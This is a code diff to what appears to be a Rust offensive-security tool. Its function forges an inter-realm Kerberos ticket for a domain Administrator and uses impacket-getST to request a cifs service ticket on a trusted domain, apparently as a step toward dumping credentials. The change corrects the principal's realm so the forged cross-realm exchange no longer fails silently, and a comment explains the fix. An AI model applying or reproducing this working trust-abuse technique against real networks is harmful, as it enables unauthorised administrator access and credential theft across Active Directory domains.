@@ -173,8 +173,15 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     }
 
     // --- Step 2: present inter-realm TGT, request TGS for cifs/<target> ---
+    //
+    // The TGT we just forged is for `Administrator@SOURCE_DOMAIN` with server
+    // `krbtgt/TARGET@SOURCE`. The principal passed to getST must match the
+    // TGT's client realm (source_domain), not the SPN's realm (target_domain) —
+    // otherwise getST treats the principal as belonging to target_domain, which
+    // doesn't match the inter-realm TGT, and the cross-realm exchange fails
+    // silently (exit 0, no ccache file). Always use source_domain here.
     let cifs_spn = format!("cifs/{target}");
-    let target_principal = format!("{target_domain}/{username}");
+    let target_principal = format!("{source_domain}/{username}");
     let mut getst = CommandBuilder::new("impacket-getST")
         .arg("-k")
         .arg("-no-pass")
